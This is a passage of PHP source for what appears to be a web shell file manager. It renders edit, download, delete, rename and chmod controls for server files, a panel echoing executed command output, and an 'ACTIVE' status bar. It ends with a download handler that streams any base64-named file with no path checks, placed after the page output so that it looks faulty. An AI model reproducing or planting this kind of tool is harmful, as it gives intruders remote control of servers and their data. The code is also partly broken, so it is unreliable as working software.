                            <?php if(!$item['is_dir']): ?>
                                <a href="?d=<?php echo base64_encode($currentDirectory); ?>&edit=<?php echo urlencode($item['name']); ?>" class="action-btn">✏️ EDIT</a>
                                <a href="?download=<?php echo base64_encode($item['name']); ?>&d=<?php echo base64_encode($currentDirectory); ?>" class="action-btn">📥 DOWNLOAD</a>
                            <?php endif; ?>
                            <form method="post" style="display:inline;" onsubmit="return confirmDelete('<?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?>')">
                                <input type="hidden" name="item_name" value="<?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?>">
                                <button type="submit" name="delete_item" class="action-btn">🗑️ DELETE</button>
                            </form>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?>">
                                <input type="text" name="new_name" placeholder="New name" style="width:100px;padding:3px;background:#222;border:1px solid #333;color:#cc0000;">
                                <button type="submit" name="rename_item" class="action-btn">📝 RENAME</button>
                            </form>
                            <?php if(!$item['is_dir']): ?>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="chmod_item" value="<?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?>">
                                <input type="text" name="perms" placeholder="0755" style="width:50px;padding:3px;background:#222;border:1px solid #333;color:#cc0000;">
                                <button type="submit" class="action-btn">🔒 CHMOD</button>
                            </form>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                    
                    <?php if(empty($items) && $currentDirectory == $homeDirectory): ?>
                    <tr>
                        <td colspan="5" style="text-align:center;padding:40px;color:#666;">
                            📁 DIRECTORY IS EMPTY<br>
                            <small>Use the sidebar to upload or create files</small>
                        </td>
                    </tr>
                    <?php endif; ?>
                </tbody>
            </table>
            
            <!-- Command Output -->
            <?php if(isset($_SESSION['cmd_output'])): ?>
            <div class="command-output">
                <strong>Command Output:</strong><br><br>
                <?php echo htmlspecialchars($_SESSION['cmd_output'], ENT_QUOTES, 'UTF-8'); ?>
                <?php unset($_SESSION['cmd_output']); ?>
            </div>
            <?php endif; ?>
        </div>
    </div>
    
    <!-- Status Bar -->
    <div class="status-bar">
        <div>STATUS: <span style="color:#00cc00;">ACTIVE</span></div>
        <div>FILES: <?php echo count(array_filter($items, function($i) { return !$i['is_dir']; })); ?></div>
        <div>FOLDERS: <?php echo count(array_filter($items, function($i) { return $i['is_dir']; })); ?></div>
        <div>TIME: <?php echo date('H:i:s'); ?> | PHP: <?php echo PHP_VERSION; ?></div>
    </div>
</body>
</html>

<?php
// Handle file download
if(isset($_GET['download'])) {
    $file = base64_decode($_GET['download']);
    $filePath = $currentDirectory . '/' . $file;
    
    if(file_exists($filePath) && !is_dir($filePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    }
}
?>